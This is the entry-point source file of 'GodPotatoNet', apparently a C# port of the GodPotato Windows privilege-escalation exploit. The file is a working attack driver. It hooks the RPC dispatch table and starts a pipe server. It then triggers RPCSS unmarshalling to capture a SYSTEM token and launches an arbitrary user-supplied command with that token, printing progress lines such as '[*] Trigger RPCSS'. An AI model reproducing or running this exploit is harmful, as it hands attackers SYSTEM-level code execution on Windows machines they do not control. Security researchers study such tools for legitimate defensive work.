using System;
using System.IO;
using GodPotatoNet.NativeAPI;
using System.Security.Principal;
using SharpToken;
using static GodPotatoNet.ArgsParse;

namespace GodPotatoNet
{
    // GodPotatoNet
    public class Program
    {

        class GodPotatoNetArgs
        {
            [ArgsAttribute("cmd","cmd /c whoami",Description = "CommandLine",Required = true)]
            public string cmd { get; set; }
        }

        // GodPotatoNet
        public static void Main(string[] args)
        {
            TextWriter ConsoleWriter = Console.Out;

            GodPotatoNetArgs potatoArgs;

            // GodPotatoNet 
            string helpMessage = PrintHelp(typeof(GodPotatoNetArgs), @"                                                                              
  ____           _ ____       _        _        _   _      _   
 / ___| ___   __| |  _ \ ___ | |_ __ _| |_ ___ | \ | | ___| |_ 
| |  _ / _ \ / _` | |_) / _ \| __/ _` | __/ _ \|  \| |/ _ \ __|
| |_| | (_) | (_| |  __/ (_) | || (_| | || (_) | |\  |  __/ |_ 
 \____|\___/ \__,_|_|   \___/ \__\__,_|\__\___/|_| \_|\___|\__|
                                             
"
, "GodPotatoNet", new string[0]);

            if (args.Length == 0)
            {
                ConsoleWriter.WriteLine(helpMessage);
                return;
            }
            else
            {
                try
                {
                    potatoArgs = ParseArgs<GodPotatoNetArgs>(args);
                }
                catch (Exception e)
                {
                    if (e.InnerException != null)
                    {
                        e = e.InnerException;
                    }
                    ConsoleWriter.WriteLine("Exception:" + e.Message);
                    ConsoleWriter.WriteLine(helpMessage);
                    return;
                }
            }

            try
            {
                GodPotatoNetContext GodPotatoNetContext = new GodPotatoNetContext(ConsoleWriter, Guid.NewGuid().ToString());

                ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", GodPotatoNetContext.CombaseModule);
                ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", GodPotatoNetContext.DispatchTablePtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", GodPotatoNetContext.UseProtseqFunctionPtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", GodPotatoNetContext.UseProtseqFunctionParamCount);

                ConsoleWriter.WriteLine("[*] HookRPC");
                GodPotatoNetContext.HookRPC();
                ConsoleWriter.WriteLine("[*] Start PipeServer");
                GodPotatoNetContext.Start();

                GodPotatoNetUnmarshalTrigger unmarshalTrigger = new GodPotatoNetUnmarshalTrigger(GodPotatoNetContext);
                try
                {
                    ConsoleWriter.WriteLine("[*] Trigger RPCSS");
                    int hr = unmarshalTrigger.Trigger();
                    ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);
                    
                }
                catch (Exception e)
                {
                    ConsoleWriter.WriteLine(e);
                }

                WindowsIdentity systemIdentity = GodPotatoNetContext.GetToken();
                if (systemIdentity != null)
                {
                    ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
                    TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);

                }
                else
                {
                    ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");
                }
                GodPotatoNetContext.Restore();
                GodPotatoNetContext.Stop();
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);

            }

        }
    }
}
